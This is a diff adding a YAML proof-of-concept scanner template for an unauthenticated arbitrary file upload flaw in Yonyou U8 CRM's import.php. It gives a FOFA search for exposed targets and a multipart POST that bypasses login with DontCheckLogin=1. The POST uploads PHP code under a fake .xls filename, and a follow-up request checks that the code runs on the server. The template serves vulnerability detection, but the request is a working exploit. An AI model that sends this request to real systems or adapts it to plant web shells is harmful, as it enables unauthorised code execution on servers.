@@ -1,0 +1,37 @@
+id: poc-yaml-yongyon-u8-crm-import-php-anyfile-upload
+info:
+  name: 用友U8CRM import.php 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 用友U8+CRM
+  fofa: body="用友U8CRM"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /crmtools/tools/import.php?DontCheckLogin=1&issubmit=1
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye0z8QbHs79gL8vW5
+  data: '------WebKitFormBoundarye0z8QbHs79gL8vW5
+
+    Content-Disposition: form-data; name="xfile"; filename="11.xls"
+
+
+    <?php echo md5({{.t1}});?>
+
+    ------WebKitFormBoundarye0z8QbHs79gL8vW5
+
+    Content-Disposition: form-data; name="combo"
+
+
+    {{.t1}}.php
+
+    ------WebKitFormBoundarye0z8QbHs79gL8vW5--'
+  expression: status_code == 200 && contains(body,"\"success\":true") && contains(body,"Database
+    error")
+- method: GET
+  path: /tmpfile/{{.t1}}.php
+  expression: status_code == 200 && body == t2
+transport: http
